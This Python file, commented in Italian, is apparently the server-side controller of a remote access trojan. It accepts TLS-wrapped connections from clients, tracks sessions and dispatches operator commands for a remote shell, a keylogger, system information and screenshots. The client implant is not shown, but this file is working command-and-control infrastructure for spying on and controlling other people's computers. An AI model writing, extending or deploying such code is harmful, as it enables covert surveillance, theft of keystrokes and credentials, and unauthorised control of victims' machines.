import socket
import ssl
import os
import threading
import logging

import pull

from client import CLIENT
from commcenter import COMMCENTER


class INTERFACE(COMMCENTER):
    def __init__(self, prs):
        # COMMCENTER usa solo attributi di classe, quindi nessun super() obbligatorio
        self.address = prs.address
        self.port = prs.port
        self.use_ssl = getattr(prs, 'ssl', True)  # Default SSL abilitato

        self.SOCKET = None  # socket di ascolto
        self.ssl_socket = None  # socket SSL wrappato
        self.ssl_context = None  # contesto SSL
        self.RUNNER = True  # flag di controllo per i loop
        self._accept_thread = None  # riferimento al thread di accept

        # Configurazione certificati
        self.BASE_DIR = os.path.dirname(os.path.abspath(__file__))
        self.CERT_DIR = os.path.join(self.BASE_DIR, "certs")

    def bind(self):
        """Crea e binda il socket, con opzionale SSL"""
        self.SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # riuso porta per restart rapidi
        self.SOCKET.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            self.SOCKET.bind((self.address, self.port))

            if self.use_ssl:
                pull.print(
                    "Successfully bind to %s%s:%i %s(SSL/TLS)"
                    % (pull.RED, self.address, self.port, pull.GREEN)
                )
            else:
                pull.print(
                    "Successfully bind to %s%s:%i %s(NO SSL)"
                    % (pull.RED, self.address, self.port, pull.YELLOW)
                )
        except Exception as e:
            pull.exit(
                "Unable to bind to %s%s:%i - %s"
                % (pull.RED, self.address, self.port, str(e))
            )

        # Se SSL è abilitato, configura il contesto SSL
        if self.use_ssl:
            self._setup_ssl()

    def _setup_ssl(self):
        """Configura il contesto SSL per il server"""
        try:
            self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)

            cert_file = os.path.join(self.CERT_DIR, "server.crt")
            key_file = os.path.join(self.CERT_DIR, "server.key")

            # Verifica che i certificati esistano
            if not os.path.exists(cert_file):
                pull.exit(f"Certificate not found: {cert_file}")
            if not os.path.exists(key_file):
                pull.exit(f"Key file not found: {key_file}")

            self.ssl_context.load_cert_chain(
                certfile=cert_file,
                keyfile=key_file,
            )

            logging.info("SSL context configured successfully")
            pull.print(f"SSL certificates loaded from: {self.CERT_DIR}")

        except ssl.SSLError as e:
            pull.exit(f"SSL configuration error: {e}")
        except Exception as e:
            pull.exit(f"Error setting up SSL: {e}")

    def accept_threads(self):
        """Thread che accetta connessioni (con o senza SSL)"""
        self.SOCKET.listen(10)

        # Se SSL è abilitato, wrappa il socket
        if self.use_ssl and self.ssl_context:
            try:
                self.ssl_socket = self.ssl_context.wrap_socket(
                    self.SOCKET,
                    server_side=True
                )
                listening_socket = self.ssl_socket
            except Exception as e:
                pull.error(f"Failed to wrap socket with SSL: {e}")
                return
        else:
            listening_socket = self.SOCKET

        pull.print(f"Listening for connections on {self.address}:{self.port}...")

        while self.RUNNER:
            try:
                conn, addr = listening_socket.accept()

                logging.info(f"New connection from {addr[0]}:{addr[1]}")

                # Se SSL è attivo, conn è già un SSLSocket
                if self.use_ssl:
                    try:
                        # Verifica che l'handshake SSL sia completato
                        cipher = conn.cipher()
                        logging.info(f"SSL connection established with {addr[0]}:{addr[1]} - Cipher: {cipher}")
                    except Exception as e:
                        logging.error(f"SSL handshake failed with {addr[0]}:{addr[1]}: {e}")
                        conn.close()
                        continue

            except OSError:
                # socket chiuso / non valido → esco pulito
                break
            except ssl.SSLError as e:
                # errore SSL durante accept
                logging.error(f"SSL accept error: {e}")
                continue
            except Exception as e:
                # errore imprevisto → loggo e continuo
                logging.error(f"accept_threads error: {e}")
                continue

            # Crea oggetto CLIENT e avvialo
            self.COUNTER += 1
            client = CLIENT(conn, addr)
            client.engage()

            self.CLIENTS.append((self.COUNTER, client))

            pull.print(f"Client #{self.COUNTER} connected from {addr[0]}:{addr[1]}")

    def accept(self):
        """Avvia il thread di accept"""
        self._accept_thread = threading.Thread(target=self.accept_threads)
        self._accept_thread.daemon = True
        self._accept_thread.start()

    #### Commands ####

    def execute(self, vals):
        if not vals:
            return

        cmd = vals[0]

        if cmd == "exit":
            self.c_exit()
        elif cmd == "help":
            self.c_help(vals)
        elif cmd == "sessions":
            self.c_sessions()
        elif cmd == "connect":
            self.c_connect(vals)
        elif cmd == "disconnect":
            self.c_disconnect()
        elif cmd == "shell":
            self.c_shell()
        elif cmd == "clear":
            self.c_clear()
        elif cmd == "keylogger":
            self.c_keylogger(vals)
        elif cmd == "sysinfo":
            self.c_sysinfo()
        elif cmd == "screenshot":
            self.c_screenshot()
        else:
            pull.error(f"Unknown command: {cmd}")

    def launch(self):
        """Avvia l'interfaccia interattiva"""
        pull.print("Launching Interface! Enter 'help' to get available commands! \n")

        try:
            while self.RUNNER:
                val = pull.get_com(self.CURRENT)
                # split() senza argomenti gestisce multiple spaces
                self.execute(val.split())
        except KeyboardInterrupt:
            pull.error("Interrupted by user, shutting down interface...")
            self.stop()

    def stop(self):
        """Ferma il server e chiude tutte le connessioni"""
        self.RUNNER = False

        # Chiudi tutti i client connessi
        for client_id, client in self.CLIENTS:
            try:
                client.close()
                logging.info(f"Closed client #{client_id}")
            except Exception as e:
                logging.error(f"Error closing client #{client_id}: {e}")

        # Chiudi il socket SSL se esiste
        if self.ssl_socket is not None:
            try:
                self.ssl_socket.close()
            except Exception as e:
                logging.error(f"Error closing SSL socket: {e}")
            self.ssl_socket = None

        # Chiudi il socket normale
        if self.SOCKET is not None:
            try:
                self.SOCKET.shutdown(socket.SHUT_RDWR)
            except OSError:
                # già chiuso o non in stato valido per shutdown
                pass
            except Exception as e:
                logging.error(f"Error shutting down socket: {e}")

            try:
                self.SOCKET.close()
            except Exception as e:
                logging.error(f"Error closing socket: {e}")

            self.SOCKET = None

        pull.print("Server stopped successfully")

    def close(self):
        """Alias per compatibilità col codice precedente"""
        self.stop()